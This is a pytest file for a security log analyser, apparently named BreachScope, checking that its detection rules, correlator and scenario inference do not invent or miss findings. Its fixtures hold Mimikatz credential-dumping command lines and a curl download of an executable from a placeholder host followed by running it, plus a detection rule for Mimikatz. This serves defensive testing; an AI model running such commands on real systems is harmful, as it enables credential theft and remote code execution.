from __future__ import annotations

import inspect
import xml.etree.ElementTree as ET
from datetime import datetime, timezone

import pytest

from breachscope.analyzer import apply_rules, apply_rules_parallel
from breachscope.canonical import build_canonical_event
from breachscope.correlator import CorrelationRule, correlate_events
from breachscope.ingest import _extract_from_xml
from breachscope.rules import parse_attack_tag, validate_rule
from breachscope.scenario import infer_scenarios
from breachscope.schemas import Event, Finding, Rule


def _construct(cls, **values):
    """Construct dataclass/model using only parameters supported by this revision."""
    signature = inspect.signature(cls)
    kwargs = {
        key: value
        for key, value in values.items()
        if key in signature.parameters
    }
    return cls(**kwargs)


def _event(
    *,
    timestamp: str,
    host: str = "WIN-A",
    source: str = "WindowsEventLog",
    event_id: str = "",
    user: str = "CORP\\alice",
    command_line: str = "",
    raw: dict | None = None,
):
    return _construct(
        Event,
        timestamp=timestamp,
        host=host,
        source=source,
        event_id=event_id,
        level="",
        user=user,
        command_line=command_line,
        raw=raw or {},
    )


def _rule(
    *,
    rid: str = "inv-rule",
    pattern: str = "mimikatz",
    operator: str = "contains",
):
    return _construct(
        Rule,
        id=rid,
        name=rid,
        description="P1-03 invariant test",
        field="command_line",
        pattern=pattern,
        mitre_technique="T1003",
        severity="high",
        operator=operator,
        fields=[],
    )


def _finding(event: Event, *, technique: str = "T9999"):
    return _construct(
        Finding,
        rule_id="inv-finding",
        rule_name="Invariant finding",
        severity="medium",
        mitre_technique=technique,
        event=event,
        matched_value=event.command_line or "x",
        matched_context=event.command_line or "x",
    )


def _call_correlate(events, rules):
    """Call correlate_events across minor signature differences fail-closed."""
    signature = inspect.signature(correlate_events)
    kwargs = {}

    if "events" in signature.parameters:
        kwargs["events"] = events
    if "findings" in signature.parameters:
        kwargs["findings"] = []
    if "correlation_rules" in signature.parameters:
        kwargs["correlation_rules"] = rules
    elif "rules" in signature.parameters:
        kwargs["rules"] = rules

    required = [
        name
        for name, parameter in signature.parameters.items()
        if parameter.default is inspect._empty
        and parameter.kind
        in (
            inspect.Parameter.POSITIONAL_ONLY,
            inspect.Parameter.POSITIONAL_OR_KEYWORD,
            inspect.Parameter.KEYWORD_ONLY,
        )
    ]
    if all(name in kwargs for name in required):
        return correlate_events(**kwargs)

    # Current BreachScope contract is events, findings, correlation_rules.
    return correlate_events(events, [], rules)


def _call_parallel(events, rules):
    signature = inspect.signature(apply_rules_parallel)
    kwargs = {}
    if "events" in signature.parameters:
        kwargs["events"] = events
    if "rules" in signature.parameters:
        kwargs["rules"] = rules
    if kwargs:
        return list(apply_rules_parallel(**kwargs))
    return list(apply_rules_parallel(events, rules))


def _finding_key(finding):
    event = finding.event
    return (
        finding.rule_id,
        event.timestamp,
        event.host,
        finding.matched_value,
    )


def test_malformed_xml_fails_fast_instead_of_fabricating_event():
    with pytest.raises(ET.ParseError):
        _extract_from_xml("<Event><System><EventID>4688</EventID>")


def test_unknown_canonical_event_stays_unknown_observed():
    canonical = build_canonical_event(
        {
            "timestamp": "2026-09-01T00:00:00Z",
            "host": "WIN-A",
            "source": "Mystery-Provider",
            "event_id": "9999",
            "user": "CORP\\alice",
            "command_line": "notepad.exe notes.txt",
            "raw": {},
        }
    )

    assert canonical["event"]["category"] == "unknown"
    assert canonical["event"]["action"] == "observed"

    # Unknown taxonomy must not invent a specialized Windows event type, but
    # provider-neutral evidence such as the original command line is allowed
    # to survive under the generic process view.
    assert canonical.get("process", {}).get("command_line") == "notepad.exe notes.txt"
    assert "authentication" not in canonical
    assert "script" not in canonical
    assert "service" not in canonical
    assert "task" not in canonical


def test_invalid_attack_tag_is_not_invented():
    assert parse_attack_tag(["attack.execution", "attack.not-a-technique"]) is None
    assert parse_attack_tag("attack.t1059.001") is None


def test_invalid_regex_rule_fails_validation():
    rule = _rule(pattern="[", operator="regex")
    assert validate_rule(rule) is False


def test_benign_command_does_not_match_unrelated_rule():
    event = _event(
        timestamp="2026-09-01T00:00:00Z",
        command_line=r"C:\Windows\System32\notepad.exe C:\Users\alice\notes.txt",
    )
    findings = list(apply_rules([event], [_rule(pattern="mimikatz")]))
    assert findings == []


def test_serial_and_parallel_analyzer_have_same_detection_set():
    events = [
        _event(
            timestamp="2026-09-01T00:00:00Z",
            command_line="mimikatz.exe privilege::debug",
        ),
        _event(
            timestamp="2026-09-01T00:00:01Z",
            command_line="notepad.exe notes.txt",
        ),
        _event(
            timestamp="2026-09-01T00:00:02Z",
            host="WIN-B",
            command_line="cmd.exe /c mimikatz sekurlsa::logonpasswords",
        ),
    ]
    rules = [_rule(pattern="mimikatz")]

    serial = list(apply_rules(events, rules))
    parallel = _call_parallel(events, rules)

    assert {_finding_key(x) for x in serial} == {
        _finding_key(x) for x in parallel
    }
    assert len({_finding_key(x) for x in serial}) == 2


def _inv_chains(chains):
    return [chain for chain in chains if chain.chain_type == "inv_chain"]


def _corr_rule(window: int = 60):
    return _construct(
        CorrelationRule,
        rule_id="inv-correlation",
        name="Invariant correlation",
        description="curl followed by process creation",
        event_a_patterns=["cmd:curl"],
        event_b_patterns=["event_id:4688"],
        time_window_seconds=window,
        required_fields=["host"],
        chain_type="inv_chain",
    )


def test_correlator_rejects_pair_outside_time_window():
    events = [
        _event(
            timestamp="2026-09-01T00:00:00Z",
            command_line="curl https://example.invalid/a.exe",
        ),
        _event(
            timestamp="2026-09-01T00:02:01Z",
            event_id="4688",
            command_line="a.exe",
        ),
    ]
    assert _inv_chains(_call_correlate(events, [_corr_rule(window=60)])) == []


def test_correlator_rejects_reverse_temporal_order():
    events = [
        _event(
            timestamp="2026-09-01T00:00:00Z",
            event_id="4688",
            command_line="a.exe",
        ),
        _event(
            timestamp="2026-09-01T00:00:10Z",
            command_line="curl https://example.invalid/a.exe",
        ),
    ]
    assert _inv_chains(_call_correlate(events, [_corr_rule(window=60)])) == []


def test_correlator_rejects_required_host_mismatch():
    events = [
        _event(
            timestamp="2026-09-01T00:00:00Z",
            host="WIN-A",
            command_line="curl https://example.invalid/a.exe",
        ),
        _event(
            timestamp="2026-09-01T00:00:10Z",
            host="WIN-B",
            event_id="4688",
            command_line="a.exe",
        ),
    ]
    assert _inv_chains(_call_correlate(events, [_corr_rule(window=60)])) == []


def test_correlator_accepts_valid_control_pair():
    events = [
        _event(
            timestamp="2026-09-01T00:00:00Z",
            host="WIN-A",
            command_line="curl https://example.invalid/a.exe",
        ),
        _event(
            timestamp="2026-09-01T00:00:10Z",
            host="WIN-A",
            event_id="4688",
            command_line="a.exe",
        ),
    ]
    chains = _inv_chains(
        _call_correlate(events, [_corr_rule(window=60)])
    )
    assert len(chains) == 1
    assert chains[0].chain_type == "inv_chain"


def test_scenario_inference_requires_chain_evidence():
    event = _event(
        timestamp="2026-09-01T00:00:00Z",
        command_line="mimikatz.exe",
    )
    scenarios = infer_scenarios([], [_finding(event, technique="T1003")])
    assert scenarios == []
